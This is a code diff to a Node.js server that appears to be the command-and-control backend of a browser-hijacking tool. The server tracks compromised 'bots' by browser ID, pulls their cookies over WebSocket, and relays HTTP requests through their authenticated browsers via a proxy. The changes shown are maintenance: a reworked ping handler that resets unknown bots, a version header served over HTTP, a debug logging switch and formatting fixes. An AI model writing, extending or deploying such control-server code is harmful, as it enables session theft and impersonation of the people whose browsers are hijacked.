@@ -4,6 +4,7 @@ const cluster = require('cluster');
 const WebSocket = require('ws');
 const https = require('https');
 const redis = require("redis");
+const http = require('http');
 const uuid = require('uuid');
 const util = require('util');
 const fs = require('fs');
@@ -33,7 +34,7 @@ const numCPUs = require('os').cpus().length;
 const PROXY_PORT = process.env.PROXY_PORT || 8080;
 const WS_PORT = process.env.WS_PORT || 4343;
 const API_SERVER_PORT = process.env.API_SERVER_PORT || 8118;
-const SERVER_VERSION = '1.0.0';
+const SERVER_VERSION = '1.0.1';
 
 const RPC_CALL_TABLE = {
     'PING': ping,
@@ -46,6 +47,31 @@ const REQUEST_TABLE = new NodeCache({
 });
 
 async function ping(websocket_connection, params) {
+
+
+    // Update bot as online
+    const bot = await Bots.findOne({
+        where: {
+            browser_id: websocket_connection.browser_id
+        }
+    });
+
+    if (!bot) {
+        websocket_connection.send(
+            JSON.stringify({
+                'id': uuid.v4(),
+                'version': SERVER_VERSION,
+                'action': 'RESET',
+                'data': {}
+            })
+        )
+        return
+    }
+
+    await bot.update({
+        is_online: true,
+    });
+
     // Send PONG message back
     websocket_connection.send(
         JSON.stringify({
@@ -55,16 +81,6 @@ async function ping(websocket_connection, params) {
             'data': {}
         })
     )
-
-    // Update bot as online
-    const bot = await Bots.findOne({
-        where: {
-            browser_id: websocket_connection.browser_id
-        }
-    });
-    await bot.update({
-        is_online: true,
-    });
 }
 
 function get_browser_proxy(input_browser_id) {
@@ -79,9 +95,9 @@ function get_browser_proxy(input_browser_id) {
 }
 
 function authenticate_client(websocket_connection) {
-    return new Promise(function(resolve, reject) {
+    return new Promise(function (resolve, reject) {
         // For timeout, will reject if no response in 30 seconds.
-        setTimeout(function() {
+        setTimeout(function () {
             reject(`A timeout occurred when authenticating WebSocket client.`);
         }, (30 * 1000));
 
@@ -109,9 +125,9 @@ function authenticate_client(websocket_connection) {
 }
 
 function get_browser_cookie_array(browser_id) {
-    return new Promise(function(resolve, reject) {
+    return new Promise(function (resolve, reject) {
         // For timeout, will reject if no response in 30 seconds.
-        setTimeout(function() {
+        setTimeout(function () {
             reject(`Get cookies RPC called timed out.`);
         }, (30 * 1000));
 
@@ -149,9 +165,9 @@ function get_browser_cookie_array(browser_id) {
 }
 
 function send_request_via_browser(browser_id, authenticated, url, method, headers, body) {
-    return new Promise(function(resolve, reject) {
+    return new Promise(function (resolve, reject) {
         // For timeout, will reject if no response in 30 seconds.
-        setTimeout(function() {
+        setTimeout(function () {
             reject(`Request Timed Out for URL ${url}!`);
         }, (30 * 1000));
 
@@ -248,7 +264,7 @@ async function get_authentication_status(inputRequestDetail) {
     // If we already have this cached we can stop here.
     const credential_data_string = await getAsync(memory_cache_key);
 
-    if(credential_data_string) {
+    if (credential_data_string) {
         const cached_record = JSON.parse(credential_data_string);
         return {
             'id': cached_record.id,
@@ -274,7 +290,7 @@ async function get_authentication_status(inputRequestDetail) {
     // No need to wait for this to resolve
     await setexAsync(
         memory_cache_key,
-        ( 60 * 10 ),
+        (60 * 10),
         JSON.stringify(browserproxy_record),
     );
 
@@ -355,7 +371,7 @@ const options = {
     //throttle: 10000,
     forceProxyHttps: true,
     wsIntercept: false,
-    silent: true
+    silent: !(process.env.DEBUGGING === "yes")
 };
 
 async function initialize_new_browser_connection(ws) {
@@ -432,7 +448,7 @@ async function initialize() {
     redis_client = redis.createClient({
         "host": process.env.REDIS_HOST,
     });
-    redis_client.on("error", function(error) {
+    redis_client.on("error", function (error) {
         logit(`Redis client encountered an error:`);
         console.error(error);
     });
@@ -449,12 +465,12 @@ async function initialize() {
     delAsync = util.promisify(redis_client.del).bind(redis_client);
 
     // Called when a new redis subscription is added
-    subscriber.on("subscribe", function(channel, count) {
+    subscriber.on("subscribe", function (channel, count) {
         //logit(`New subscription created for channel ${channel}, bring total to ${count}.`);
     });
 
     // Called when a new message is written to a channel
-    subscriber.on("message", function(channel, message) {
+    subscriber.on("message", function (channel, message) {
         //logit(`Received a new message at channel '${channel}', message is '${message}'`);
 
         // For messages being sent to the browser from the proxy
@@ -495,8 +511,21 @@ async function initialize() {
         }
     });
 
+    // Build HTTP server first and pass to WS server
+    // This is a forward-looking change so versioning doesn't
+    // become a clusterfuck with addon tools for the server.
+    const http_server = http.createServer(function (req, res) {
+        res.writeHead(200, {
+            'Content-Type': 'text/plain',
+            'CC-Server-Version': SERVER_VERSION,
+        });
+        res.write('');
+        res.end();
+    }).listen(WS_PORT);
+
     wss = new WebSocket.Server({
-        port: WS_PORT
+        server: http_server
+        // port: WS_PORT
     });
 
     wss.on('connection', async function connection(ws) {
